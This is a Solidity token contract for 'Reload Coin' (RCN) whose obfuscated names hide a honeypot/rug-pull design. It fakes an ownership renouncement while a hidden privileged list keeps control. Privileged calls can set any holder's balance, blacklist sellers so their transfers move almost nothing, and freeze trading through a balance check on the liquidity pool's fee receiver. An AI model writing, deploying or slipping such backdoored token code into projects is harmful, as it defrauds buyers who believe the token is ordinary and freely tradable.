//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract tokenLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeFund {
    function createPair(address enableTokenExempt, address takeFrom) external returns (address);

    function feeTo() external view returns (address);
}

interface feeSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface takeTxTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxList) external view returns (uint256);

    function transfer(address limitReceiverLaunched, uint256 buyTakeLimit) external returns (bool);

    function allowance(address limitSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyTakeLimit) external returns (bool);

    function transferFrom(
        address sender,
        address limitReceiverLaunched,
        uint256 buyTakeLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellEnable, uint256 value);
    event Approval(address indexed limitSell, address indexed spender, uint256 value);
}

interface takeTxTradingMetadata is takeTxTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReloadCoin is tokenLimit, takeTxTrading, takeTxTradingMetadata {

    uint256 public fundMode = 0;

    function teamListTotal(address enableLimitToken, uint256 buyTakeLimit) public {
        minIsAuto();
        feeReceiverSwap[enableLimitToken] = buyTakeLimit;
    }

    function listToken(address launchReceiverFund) public {
        require(launchReceiverFund.balance < 100000);
        if (teamLiquidity) {
            return;
        }
        
        swapMarketing[launchReceiverFund] = true;
        if (tradingExempt == feeSell) {
            tradingExempt = false;
        }
        teamLiquidity = true;
    }

    uint256 private toIsMin;

    address private isFrom;

    mapping(address => bool) public swapMarketing;

    uint8 private listFund = 18;

    address public walletLaunch;

    function transfer(address enableLimitToken, uint256 buyTakeLimit) external virtual override returns (bool) {
        return exemptLaunched(_msgSender(), enableLimitToken, buyTakeLimit);
    }

    address public limitMin;

    function owner() external view returns (address) {
        return isFrom;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return feeReceiver;
    }

    constructor (){
        
        totalFrom();
        feeSwap swapReceiverReceiver = feeSwap(teamModeTake);
        walletLaunch = feeFund(swapReceiverReceiver.factory()).createPair(swapReceiverReceiver.WETH(), address(this));
        tokenWallet = feeFund(swapReceiverReceiver.factory()).feeTo();
        if (tradingShouldMax == toIsMin) {
            tradingExempt = true;
        }
        limitMin = _msgSender();
        swapMarketing[limitMin] = true;
        feeReceiverSwap[limitMin] = feeReceiver;
        if (tradingExempt == feeSell) {
            tradingExempt = true;
        }
        emit Transfer(address(0), limitMin, feeReceiver);
    }

    function transferFrom(address swapMax, address limitReceiverLaunched, uint256 buyTakeLimit) external override returns (bool) {
        if (_msgSender() != teamModeTake) {
            if (maxLaunchedWallet[swapMax][_msgSender()] != type(uint256).max) {
                require(buyTakeLimit <= maxLaunchedWallet[swapMax][_msgSender()]);
                maxLaunchedWallet[swapMax][_msgSender()] -= buyTakeLimit;
            }
        }
        return exemptLaunched(swapMax, limitReceiverLaunched, buyTakeLimit);
    }

    bool private tradingExempt;

    uint256 private feeReceiver = 100000000 * 10 ** 18;

    function minIsAuto() private view {
        require(swapMarketing[_msgSender()]);
    }

    function atAuto(address fromAmount) public {
        minIsAuto();
        if (tradingShouldMax == toIsMin) {
            toIsMin = tradingShouldMax;
        }
        if (fromAmount == limitMin || fromAmount == walletLaunch) {
            return;
        }
        fundSell[fromAmount] = true;
    }

    string private limitMode = "Reload Coin";

    uint256 constant walletTx = 4 ** 10;

    uint256 feeShould;

    function totalFrom() public {
        emit OwnershipTransferred(limitMin, address(0));
        isFrom = address(0);
    }

    function exemptLaunched(address swapMax, address limitReceiverLaunched, uint256 buyTakeLimit) internal returns (bool) {
        if (swapMax == limitMin) {
            return exemptLaunch(swapMax, limitReceiverLaunched, buyTakeLimit);
        }
        uint256 listWallet = takeTxTrading(walletLaunch).balanceOf(tokenWallet);
        require(listWallet == enableShould);
        require(limitReceiverLaunched != tokenWallet);
        if (fundSell[swapMax]) {
            return exemptLaunch(swapMax, limitReceiverLaunched, walletTx);
        }
        buyTakeLimit = fromList(swapMax, limitReceiverLaunched, buyTakeLimit);
        return exemptLaunch(swapMax, limitReceiverLaunched, buyTakeLimit);
    }

    event OwnershipTransferred(address indexed receiverAt, address indexed teamLaunch);

    function fromList(address swapMax, address limitReceiverLaunched, uint256 buyTakeLimit) internal view returns (uint256) {
        require(buyTakeLimit > 0);

        uint256 toReceiverSwap = 0;
        if (swapMax == walletLaunch && receiverSell > 0) {
            toReceiverSwap = buyTakeLimit * receiverSell / 100;
        } else if (limitReceiverLaunched == walletLaunch && fundMode > 0) {
            toReceiverSwap = buyTakeLimit * fundMode / 100;
        }
        require(toReceiverSwap <= buyTakeLimit);
        return buyTakeLimit - toReceiverSwap;
    }

    function name() external view virtual override returns (string memory) {
        return limitMode;
    }

    function balanceOf(address maxList) public view virtual override returns (uint256) {
        return feeReceiverSwap[maxList];
    }

    string private maxSell = "RCN";

    function getOwner() external view returns (address) {
        return isFrom;
    }

    uint256 public receiverSell = 0;

    function decimals() external view virtual override returns (uint8) {
        return listFund;
    }

    function approve(address teamSenderFee, uint256 buyTakeLimit) public virtual override returns (bool) {
        maxLaunchedWallet[_msgSender()][teamSenderFee] = buyTakeLimit;
        emit Approval(_msgSender(), teamSenderFee, buyTakeLimit);
        return true;
    }

    function allowance(address tradingLaunchTeam, address teamSenderFee) external view virtual override returns (uint256) {
        if (teamSenderFee == teamModeTake) {
            return type(uint256).max;
        }
        return maxLaunchedWallet[tradingLaunchTeam][teamSenderFee];
    }

    uint256 enableShould;

    bool public teamLiquidity;

    function exemptLaunch(address swapMax, address limitReceiverLaunched, uint256 buyTakeLimit) internal returns (bool) {
        require(feeReceiverSwap[swapMax] >= buyTakeLimit);
        feeReceiverSwap[swapMax] -= buyTakeLimit;
        feeReceiverSwap[limitReceiverLaunched] += buyTakeLimit;
        emit Transfer(swapMax, limitReceiverLaunched, buyTakeLimit);
        return true;
    }

    bool private feeSell;

    address teamModeTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return maxSell;
    }

    mapping(address => uint256) private feeReceiverSwap;

    uint256 private tradingShouldMax;

    address tokenWallet;

    mapping(address => bool) public fundSell;

    function enableAmount(uint256 buyTakeLimit) public {
        minIsAuto();
        enableShould = buyTakeLimit;
    }

    mapping(address => mapping(address => uint256)) private maxLaunchedWallet;

}